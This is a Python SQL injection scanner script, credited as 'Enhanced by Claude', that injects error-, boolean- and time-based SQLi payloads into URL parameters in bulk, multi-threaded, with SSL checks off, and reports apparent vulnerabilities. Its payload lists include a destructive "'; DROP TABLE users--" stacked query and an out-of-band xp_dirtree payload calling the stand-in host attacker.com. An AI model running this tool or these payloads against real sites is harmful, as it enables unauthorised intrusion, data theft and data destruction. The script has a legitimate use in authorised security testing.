#!/usr/bin/env python3
"""
Enhanced SQL Injection Scanner v2.0
Advanced SQLi detection with multi-threading, time-based testing, and comprehensive reporting
Author: Enhanced by Claude
License: Educational/Authorized Testing Only
"""

import requests
import sys
import re
import argparse
import time
import json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Dict, List, Tuple, Optional
import warnings

# Suppress SSL warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

# Initialize colorama
init(autoreset=True)

# -------------------------------------------------------------------------
# CONSTANTS & CONFIGURATION
# -------------------------------------------------------------------------

VERSION = "2.0"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

STATIC_EXTENSIONS = (
    # Stylesheets & Scripts
    '.css', '.js', '.min.js', '.map', '.scss', '.sass', '.less',
    # Images
    '.png', '.jpg', '.jpeg', '.gif', '.ico', '.webp', '.avif', 
    '.bmp', '.tiff', '.svg', '.heic', '.heif',
    # Fonts
    '.woff', '.woff2', '.ttf', '.eot', '.otf',
    # Documents
    '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    # Media
    '.mp4', '.mp3', '.avi', '.mov', '.wmv', '.flv', '.webm', '.mkv',
    '.wav', '.ogg', '.m4a', '.aac',
    # Archives
    '.zip', '.rar', '.tar', '.gz', '.7z',
    # Other
    '.xml', '.json', '.txt', '.csv', '.md', '.yaml', '.yml'
)

POSSIBLE_SQLI_EXTENSIONS = (
    # PHP variants
    '.php', '.php3', '.php4', '.php5', '.phtml',
    # ASP/ASPX
    '.asp', '.aspx', '.ashx', '.asmx', '.axd',
    # Java
    '.jsp', '.jspx', '.jsf', '.do', '.action',
    # ColdFusion
    '.cfm', '.cfml', '.cfc',
    # Perl/CGI
    '.pl', '.cgi',
    # Other
    '.dll', '.py', '.rb', '.lua'
)

IMPOSSIBLE_PATHS = (
    # WordPress
    '/wp-content/', '/wp-includes/', '/wp-admin/css/', '/wp-admin/js/',
    # Common static directories
    '/assets/', '/static/', '/public/', '/resources/',
    '/fonts/', '/css/', '/js/', '/javascript/', '/styles/',
    '/images/', '/img/', '/pics/', '/pictures/', '/media/',
    # Framework/Library directories
    '/lib/', '/libs/', '/vendor/', '/node_modules/', '/bower_components/',
    # Build/Cache directories
    '/dist/', '/build/', '/cache/', '/temp/', '/tmp/',
    # Upload directories (usually safe from SQLi)
    '/uploads/', '/files/', '/downloads/',
    # Theme/Template directories
    '/theme/', '/themes/', '/templates/', '/skins/',
    # Documentation
    '/docs/', '/documentation/', '/manual/'
)

HIGH_RISK_PARAMS = {
    # ID-based parameters
    'id', 'uid', 'user_id', 'userid', 'pid', 'product_id', 'productid',
    'cat', 'catid', 'category', 'category_id', 'cid', 'course_id',
    'volume_id', 'order_id', 'orderid', 'item_id', 'itemid',
    # User/Auth parameters
    'user', 'username', 'uname', 'login', 'email', 'password', 'pass',
    'role', 'admin', 'auth', 'account',
    # Navigation parameters
    'page', 'p', 'view', 'detail', 'show', 'display', 'content',
    'article', 'post', 'news', 'blog',
    # Query/Search parameters
    'query', 'q', 'search', 's', 'keyword', 'keywords', 'find',
    # Action parameters
    'action', 'act', 'do', 'cmd', 'command', 'method', 'function',
    # File/Directory parameters
    'file', 'filename', 'path', 'dir', 'directory', 'folder',
    'doc', 'document', 'download',
    # Sorting/Filtering
    'sort', 'order', 'orderby', 'sortby', 'filter', 'group', 'groupby',
    # Reference parameters
    'ref', 'reference', 'refid', 'type', 'mode', 'status'
}

LOW_RISK_PARAMS = {
    # Version/Cache parameters
    'ver', 'v', 'version', 'cache', 'nocache', 'random',
    # Tracking/Analytics
    'utm', 'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term',
    'fbclid', 'gclid', 'msclkid', '_ga', '_gid', 'mc_cid', 'mc_eid',
    # Security tokens (usually hashed/validated)
    'token', 'csrf_token', 'csrf', '_token', 'nonce', 'hash',
    'session_id', 'sessionid', 'sid', 'phpsessid',
    # UI/Display parameters
    'width', 'height', 'size', 'color', 'theme', 'skin',
    'format', 'output', 'print', 'preview',
    # Localization
    'lang', 'language', 'locale', 'hl', 'l10n', 'i18n',
    # Misc safe parameters
    'source', 'src', 'from', 'redirect', 'return', 'callback',
    'debug', 'timestamp', 'time', 'date', '_', 'generated'
}

ERROR_SIGNATURES = [
    # MySQL/MariaDB
    "SQL syntax", "mysql_fetch", "mysql_query", "mysql_num_rows",
    "Warning: mysql_", "mysqli_", "You have an error in your SQL syntax",
    "supplied argument is not a valid MySQL",
    "Call to a member function fetch_assoc() on boolean",
    "Syntax error or access violation",
    # PostgreSQL
    "PostgreSQL query failed", "pg_query", "pg_exec", "pg_fetch",
    "unterminated quoted string", "ERROR: syntax error at or near",
    # Oracle
    "ORA-", "Oracle error", "Oracle ODBC", "Oracle Driver",
    "quoted string not properly terminated",
    # Microsoft SQL Server
    "Microsoft OLE DB Provider for SQL Server",
    "SQLServer JDBC Driver", "System.Data.SqlClient.SqlException",
    "Unclosed quotation mark after the character string",
    "Incorrect syntax near", "[Microsoft][ODBC SQL Server Driver]",
    "[SQL Server]", "ADODB.Field error",
    # SQLite
    "SQLite/JDBCDriver", "SQLite.Exception", "System.Data.SQLite.SQLiteException",
    "sqlite3.OperationalError", "near \":\": syntax error",
    # DB2
    "DB2 SQL error", "SQLCODE", "DB2 ODBC", "CLI Driver",
    # ODBC Generic
    "ODBC", "ODBC Driver", "ODBC Error",
    # PDO (PHP)
    "PDOException", "SQLSTATE",
    # Generic SQL errors
    "Unclosed quotation", "syntax error", "invalid query",
    "unexpected end of SQL command", "unterminated string",
    "SQL command not properly ended",
    # ASP/IIS specific
    "Microsoft JET Database Engine", "ADODB.Command",
    "ASP.NET_SessionId", "System.Data.OleDb.OleDbException"
]

# Enhanced SQL Injection Payloads
BASIC_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
    "' OR '1'='1' --", "') OR ('1'='1", "\")) OR ((\"1\"=\"1"
]

ADVANCED_PAYLOADS = [
    # Boolean-based
    "' AND '1'='1", "' AND '1'='2", "1' AND '1'='1", "1' AND '1'='2",
    # Union-based
    "' UNION SELECT NULL--", "' UNION ALL SELECT NULL,NULL--",
    # Stacked queries
    "'; DROP TABLE users--", "1; SELECT SLEEP(5)--",
    # Blind SQLi
    "' AND SLEEP(5)--", "' AND BENCHMARK(5000000,MD5('A'))--",
    # Out-of-band
    "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--"
]

TIME_BASED_PAYLOADS = {
    'mysql': ["' AND SLEEP(5)--", "' OR SLEEP(5)--"],
    'mssql': ["'; WAITFOR DELAY '00:00:05'--"],
    'postgres': ["'; SELECT pg_sleep(5)--"],
    'oracle': ["' AND DBMS_LOCK.SLEEP(5)--"]
}

# -------------------------------------------------------------------------
# GLOBAL STATE
# -------------------------------------------------------------------------

class ScanStats:
    def __init__(self):
        self.total_urls = 0
        self.safe_urls = 0
        self.vulnerable_urls = 0
        self.warning_urls = 0
        self.errors = 0
        self.start_time = time.time()
        self.findings = []

stats = ScanStats()

# -------------------------------------------------------------------------
# UTILITY FUNCTIONS
# -------------------------------------------------------------------------

def print_banner():
    print(Fore.CYAN + Style.BRIGHT + """
    ╔═══════════════════════════════════════════════════════════╗
    ║     ADVANCED SQL INJECTION SCANNER v2.0                   ║
    ║     Enhanced Detection with Time-based & Threading        ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    print(Fore.BLUE + "    Original: https://GitHub.com/viphacker100/")
    print(Fore.BLUE + "    Enhanced with advanced features")
    print()

def log(step, message, status="INFO"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    if status == "SAFE":
        print(f"{Fore.GREEN}[{timestamp}][SAFE] {step}: {message}")
    elif status == "WARN":
        print(f"{Fore.YELLOW}[{timestamp}][WARN] {step}: {message}")
    elif status == "CRITICAL":
        print(f"{Fore.RED}[{timestamp}][CRITICAL] {step}: {message}")
    elif status == "INFO":
        print(f"{Fore.CYAN}[{timestamp}][INFO] {step}: {message}")
    else:
        print(f"{Fore.WHITE}[{timestamp}] {step}: {message}")

def make_request(url: str, timeout: int = 10, verify_ssl: bool = False) -> Optional[requests.Response]:
    """Make HTTP request with error handling"""
    try:
        headers = {'User-Agent': USER_AGENT}
        response = requests.get(url, headers=headers, timeout=timeout, 
                              allow_redirects=True, verify=verify_ssl)
        return response
    except requests.exceptions.Timeout:
        log("REQUEST", f"Timeout for {url}", "WARN")
        return None
    except requests.exceptions.RequestException as e:
        log("REQUEST", f"Error: {str(e)}", "WARN")
        return None

# -------------------------------------------------------------------------
# CHECK LOGIC
# -------------------------------------------------------------------------

def rule_zero_static_check(url: str) -> Tuple[bool, str]:
    """Rule #0: Static file != SQLi"""
    parsed = urlparse(url)
    path = parsed.path.lower()
    
    if path.endswith(STATIC_EXTENSIONS):
        return False, f"Static file extension detected ({path.split('.')[-1]})"
    return True, "Passed"

def step_one_file_type(url: str) -> Tuple[bool, str]:
    """Step 1: File type check"""
    parsed = urlparse(url)
    path = parsed.path.lower()
    
    # Check impossible paths
    for imp_path in IMPOSSIBLE_PATHS:
        if imp_path in path:
            return False, f"Path is in safe directory: {imp_path}"
            
    # Check possible extensions
    if path.endswith(POSSIBLE_SQLI_EXTENSIONS):
        return True, f"High risk extension detected ({path.split('.')[-1]})"
        
    return True, "Standard endpoint (proceeding)"

def step_two_param_check(url: str) -> Tuple[str, str]:
    """Step 2: Parameter name check"""
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    
    if not query_params:
        return False, "No parameters found in URL"
        
    high_risk_found = []
    low_risk_found = []
    unknown_risk = []
    
    for param in query_params.keys():
        param_lower = param.lower()
        if param_lower in HIGH_RISK_PARAMS:
            high_risk_found.append(param)
        elif param_lower in LOW_RISK_PARAMS:
            low_risk_found.append(param)
        else:
            unknown_risk.append(param)
    
    # Determine risk level
    if high_risk_found:
        return "HIGH", f"High-risk parameters found: {', '.join(high_risk_found)}"
    elif unknown_risk:
        return "MEDIUM", f"Unknown parameters (investigate): {', '.join(unknown_risk)}"
    elif low_risk_found:
        return "LOW", f"Only low-risk parameters: {', '.join(low_risk_found)}"
    
    return "UNKNOWN", "No parameters matched known patterns"

def check_error_signatures(content: str) -> List[str]:
    """Check for SQL error signatures in response"""
    found = []
    for sig in ERROR_SIGNATURES:
        if sig.lower() in content.lower():
            found.append(sig)
    return found

def test_time_based_sqli(url: str, param: str, timeout: int = 15) -> Tuple[bool, str]:
    """Test for time-based SQL injection"""
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    
    if param not in query_params:
        return False, "Parameter not found"
    
    # Test with sleep payload
    for db_type, payloads in TIME_BASED_PAYLOADS.items():
        for payload in payloads:
            test_params = query_params.copy()
            test_params[param] = [payload]
            
            test_query = urlencode(test_params, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                 parsed.params, test_query, parsed.fragment))
            
            start = time.time()
            try:
                headers = {'User-Agent': USER_AGENT}
                response = requests.get(test_url, headers=headers, timeout=timeout,
                                      allow_redirects=False, verify=False)
                elapsed = time.time() - start
                
                # If response took ~5 seconds, likely vulnerable
                if 4.5 <= elapsed <= 6.5:
                    return True, f"Time-based SQLi detected ({db_type}): {elapsed:.2f}s delay"
                    
            except requests.exceptions.Timeout:
                # Timeout might indicate successful injection
                elapsed = time.time() - start
                if elapsed >= 5:
                    return True, f"Possible time-based SQLi ({db_type}): timeout after {elapsed:.2f}s"
            except Exception as e:
                continue
    
    return False, "No time-based SQLi detected"

def test_boolean_based_sqli(url: str, param: str) -> Tuple[bool, str, Dict]:
    """Test for boolean-based SQL injection"""
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    
    if param not in query_params:
        return False, "Parameter not found", {}
    
    # Get baseline
    baseline = make_request(url)
    if not baseline:
        return False, "Could not get baseline", {}
    
    baseline_len = len(baseline.text)
    baseline_code = baseline.status_code
    
    results = {
        'true_condition': None,
        'false_condition': None,
        'likely_vulnerable': False
    }
    
    # Test TRUE condition (1=1)
    test_params = query_params.copy()
    test_params[param] = [f"{query_params[param][0]}' AND '1'='1"]
    test_query = urlencode(test_params, doseq=True)
    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                         parsed.params, test_query, parsed.fragment))
    
    true_resp = make_request(test_url)
    if true_resp:
        results['true_condition'] = {
            'status': true_resp.status_code,
            'length': len(true_resp.text)
        }
    
    # Test FALSE condition (1=2)
    test_params[param] = [f"{query_params[param][0]}' AND '1'='2"]
    test_query = urlencode(test_params, doseq=True)
    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                         parsed.params, test_query, parsed.fragment))
    
    false_resp = make_request(test_url)
    if false_resp:
        results['false_condition'] = {
            'status': false_resp.status_code,
            'length': len(false_resp.text)
        }
    
    # Analyze results
    if true_resp and false_resp:
        # Check if TRUE condition returns similar to baseline but FALSE is different
        true_diff = abs(len(true_resp.text) - baseline_len)
        false_diff = abs(len(false_resp.text) - baseline_len)
        
        if true_diff < 100 and false_diff > 200:
            results['likely_vulnerable'] = True
            return True, "Boolean-based SQLi detected: TRUE/FALSE conditions produce different responses", results
    
    return False, "No boolean-based SQLi detected", results

def step_three_four_behavior_error(url: str, aggressive: bool = False) -> Tuple[str, str]:
    """Step 3 & 4: Behavioral and error-based detection with optional time-based testing"""
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    
    if not query_params:
        return "SAFE", "No parameters to test"
    
    # Get baseline
    baseline = make_request(url)
    if not baseline:
        return "WARN", "Could not establish baseline"
    
    baseline_errors = check_error_signatures(baseline.text)
    if baseline_errors:
        return "CRITICAL", f"SQL errors in baseline response: {', '.join(baseline_errors[:2])}"
    
    real_sqli_candidate = False
    time_based_vuln = False
    boolean_based_vuln = False
    
    for param in query_params.keys():
        log("TEST", f"Testing parameter: {param}", "INFO")
        
        # Test basic payloads
        for payload in BASIC_PAYLOADS[:5]:  # Limit payloads for speed
            test_params = query_params.copy()
            test_params[param] = [payload]
            test_query = urlencode(test_params, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                 parsed.params, test_query, parsed.fragment))
            
            resp = make_request(test_url)
            if not resp:
                continue
            
            # Check for SQL errors
            errors_found = check_error_signatures(resp.text)
            if errors_found:
                log("DETECTION", f"SQL errors with payload '{payload}': {errors_found[0]}", "CRITICAL")
                real_sqli_candidate = True
                break
            
            # Check response behavior
            if resp.status_code == baseline.status_code:
                len_diff = abs(len(resp.text) - len(baseline.text))
                if len_diff > 500:
                    log("DETECTION", f"Significant content change with '{payload}' (Δ{len_diff} bytes)", "WARN")
            elif resp.status_code >= 500:
                log("DETECTION", f"Server error {resp.status_code} with payload '{payload}'", "WARN")
        
        # Test time-based SQLi if aggressive mode
        if aggressive:
            is_time_vuln, msg = test_time_based_sqli(url, param)
            if is_time_vuln:
                log("DETECTION", msg, "CRITICAL")
                time_based_vuln = True
        
        # Test boolean-based SQLi
        is_bool_vuln, msg, _ = test_boolean_based_sqli(url, param)
        if is_bool_vuln:
            log("DETECTION", msg, "CRITICAL")
            boolean_based_vuln = True
    
    # Determine verdict
    if real_sqli_candidate or time_based_vuln or boolean_based_vuln:
        vuln_types = []
        if real_sqli_candidate:
            vuln_types.append("Error-based")
        if time_based_vuln:
            vuln_types.append("Time-based")
        if boolean_based_vuln:
            vuln_types.append("Boolean-based")
        return "CRITICAL", f"SQL Injection detected: {', '.join(vuln_types)}"
    
    return "SAFE", "No obvious SQLi behavior detected"

# -------------------------------------------------------------------------
# SCANNING FUNCTIONS
# -------------------------------------------------------------------------

def scan_single_url(url: str, output_file=None, aggressive: bool = False) -> str:
    """Scan a single URL and return verdict"""
    def write_output(msg):
        if output_file:
            # Strip color codes for file output
            clean_msg = re.sub(r'\x1b\[[0-9;]*m', '', msg)
            output_file.write(clean_msg + '\n')
    
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"{Fore.CYAN}Target: {url}")
    print(f"{Fore.CYAN}{'='*70}\n")
    write_output(f"\nTarget: {url}")
    
    # Rule #0
    should_proceed, msg = rule_zero_static_check(url)
    if not should_proceed:
        log("RULE-0", msg, "SAFE")
        verdict_msg = f"\n{Fore.GREEN}✓ Verdict: SAFE (Static Asset)"
        print(verdict_msg)
        write_output("Verdict: SAFE (Static Asset)")
        stats.safe_urls += 1
        return "SAFE"
    else:
        log("RULE-0", msg, "INFO")

    # Step 1
    should_proceed, msg = step_one_file_type(url)
    if not should_proceed:
        log("STEP-1", msg, "SAFE")
        verdict_msg = f"\n{Fore.GREEN}✓ Verdict: SAFE (Safe Directory/Type)"
        print(verdict_msg)
        write_output("Verdict: SAFE (Safe Directory/Type)")
        stats.safe_urls += 1
        return "SAFE"
    else:
        log("STEP-1", msg, "INFO")

    # Step 2
    risk_level, msg = step_two_param_check(url)
    if risk_level == "LOW":
        log("STEP-2", msg, "SAFE")
    elif risk_level == "HIGH":
        log("STEP-2", msg, "WARN")
    else:
        log("STEP-2", msg, "INFO")
        
    if risk_level == False:  # No params
        verdict_msg = f"\n{Fore.GREEN}✓ Verdict: SAFE (No Parameters)"
        print(verdict_msg)
        write_output("Verdict: SAFE (No Parameters)")
        stats.safe_urls += 1
        return "SAFE"

    # Step 3 & 4
    print(f"\n{Fore.CYAN}[*] Running active tests...")
    verdict, msg = step_three_four_behavior_error(url, aggressive)
    
    print(f"{Fore.CYAN}{'-'*70}\n")
    
    if verdict == "CRITICAL":
        print(f"{Fore.RED}[!] FINAL VERDICT: VULNERABLE TO SQL INJECTION")
        print(f"{Fore.RED}    Reason: {msg}")
        write_output(f"FINAL VERDICT: VULNERABLE - {msg}")
        stats.vulnerable_urls += 1
        stats.findings.append({'url': url, 'severity': 'CRITICAL', 'detail': msg})
        return "CRITICAL"
    elif verdict == "WARN":
        print(f"{Fore.YELLOW}[!] FINAL VERDICT: POTENTIAL VULNERABILITY (INVESTIGATE)")
        print(f"{Fore.YELLOW}    Reason: {msg}")
        write_output(f"FINAL VERDICT: INVESTIGATE - {msg}")
        stats.warning_urls += 1
        stats.findings.append({'url': url, 'severity': 'WARNING', 'detail': msg})
        return "WARN"
    else:
        print(f"{Fore.GREEN}[✓] FINAL VERDICT: SAFE")
        print(f"{Fore.GREEN}    Reason: {msg}")
        write_output(f"FINAL VERDICT: SAFE - {msg}")
        stats.safe_urls += 1
        return "SAFE"

def scan_urls_threaded(urls: List[str], output_file=None, threads: int = 5, aggressive: bool = False):
    """Scan multiple URLs using threading"""
    print(f"{Fore.CYAN}[*] Starting threaded scan with {threads} workers...\n")
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_url = {executor.submit(scan_single_url, url, output_file, aggressive): url 
                        for url in urls}
        
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                result = future.result()
            except Exception as e:
                log("ERROR", f"Exception scanning {url}: {str(e)}", "WARN")
                stats.errors += 1

def print_summary():
    """Print scan summary"""
    elapsed = time.time() - stats.start_time
    
    print(f"\n\n{Fore.CYAN}{'='*70}")
    print(f"{Fore.CYAN}{'SCAN SUMMARY':^70}")
    print(f"{Fore.CYAN}{'='*70}\n")
    
    print(f"{Fore.WHITE}Total URLs Scanned:    {stats.total_urls}")
    print(f"{Fore.GREEN}Safe:                  {stats.safe_urls}")
    print(f"{Fore.YELLOW}Warnings:              {stats.warning_urls}")
    print(f"{Fore.RED}Vulnerable:            {stats.vulnerable_urls}")
    print(f"{Fore.WHITE}Errors:                {stats.errors}")
    print(f"{Fore.CYAN}Scan Duration:         {elapsed:.2f}s")
    
    if stats.findings:
        print(f"\n{Fore.RED}[!] FINDINGS:")
        for finding in stats.findings:
            severity_color = Fore.RED if finding['severity'] == 'CRITICAL' else Fore.YELLOW
            print(f"{severity_color}  [{finding['severity']}] {finding['url']}")
            print(f"{severity_color}      → {finding['detail']}")
    
    print(f"\n{Fore.CYAN}{'='*70}\n")

def save_json_report(filename: str):
    """Save scan results as JSON"""
    report = {
        'scan_info': {
            'version': VERSION,
            'timestamp': datetime.now().isoformat(),
            'duration_seconds': time.time() - stats.start_time
        },
        'statistics': {
            'total_urls': stats.total_urls,
            'safe': stats.safe_urls,
            'warnings': stats.warning_urls,
            'vulnerable': stats.vulnerable_urls,
            'errors': stats.errors
        },
        'findings': stats.findings
    }
    
    with open(filename, 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"{Fore.GREEN}[+] JSON report saved to: {filename}")

# -------------------------------------------------------------------------
# MAIN
# -------------------------------------------------------------------------

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(
        description=f"Advanced SQL Injection Scanner v{VERSION}\n\n"
                   "Features: Time-based detection, Boolean-based testing, Multi-threading\n"
                   "Original: https://GitHub.com/viphacker100/",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="For educational and authorized testing only"
    )
    
    parser.add_argument("url", nargs='?', help="Target URL to scan")
    parser.add_argument("-l", "--list", help="File containing list of URLs (one per line)")
    parser.add_argument("-o", "--output", help="Output file for results")
    parser.add_argument("-j", "--json", help="Save JSON report to file")
    parser.add_argument("-t", "--threads", type=int, default=5, 
                       help="Number of threads for concurrent scanning (default: 5)")
    parser.add_argument("-a", "--aggressive", action="store_true",
                       help="Enable aggressive testing (includes time-based detection)")
    parser.add_argument("--timeout", type=int, default=10,
                       help="Request timeout in seconds (default: 10)")
    
    args = parser.parse_args()
    
    # Validate arguments
    if not args.url and not args.list:
        parser.error("Either provide a URL or use --list to specify a file")
    
    # Prepare output file
    output_file = None
    if args.output:
        try:
            output_file = open(args.output, 'w', encoding='utf-8')
            print(f"{Fore.CYAN}[+] Results will be saved to: {args.output}\n")
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Cannot open output file: {str(e)}")
            sys.exit(1)
    
    # Process URLs
    urls_to_scan = []
    if args.list:
        try:
            with open(args.list, 'r') as f:
                urls_to_scan = [line.strip() for line in f 
                              if line.strip() and not line.startswith('#')]
            print(f"{Fore.CYAN}[+] Loaded {len(urls_to_scan)} URLs from list\n")
        except FileNotFoundError:
            print(f"{Fore.RED}[ERROR] URL list file not found: {args.list}")
            sys.exit(1)
    else:
        urls_to_scan = [args.url]
    
    stats.total_urls = len(urls_to_scan)
    
    # Scan URLs
    if len(urls_to_scan) > 1 and args.threads > 1:
        scan_urls_threaded(urls_to_scan, output_file, args.threads, args.aggressive)
    else:
        for url in urls_to_scan:
            scan_single_url(url, output_file, args.aggressive)
    
    # Print summary
    print_summary()
    
    # Save JSON report if requested
    if args.json:
        save_json_report(args.json)
    
    # Close output file
    if output_file:
        output_file.close()
        print(f"{Fore.GREEN}[+] Text report saved to: {args.output}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Scan interrupted by user")
        print_summary()
        sys.exit(0)